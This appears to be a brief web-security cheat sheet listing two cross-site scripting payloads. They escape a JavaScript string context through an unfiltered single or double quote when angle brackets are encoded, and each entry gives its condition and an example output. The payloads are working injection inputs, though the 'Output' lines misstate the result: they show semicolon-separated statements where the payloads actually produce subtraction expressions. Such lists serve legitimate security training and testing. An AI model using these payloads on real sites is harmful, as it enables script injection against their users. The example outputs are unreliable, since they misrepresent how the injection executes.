1. XSS into JavaScript String with Angle Brackets Encoded (Single Quote)
- Payload: '-alert(1)-'
- Condition: Input is reflected inside a JavaScript string context where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but single quotes and other characters are not filtered
- Output: <script>var x=''; alert(1); ''</script>

---

2. XSS into JavaScript String with Angle Brackets Encoded (Double Quote)
- Payload: "-alert(1)-"
- Condition: Input is reflected inside a JavaScript string context where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but double quotes and other characters are not filtered
- Output: <script>var x=""; alert(1); ""</script>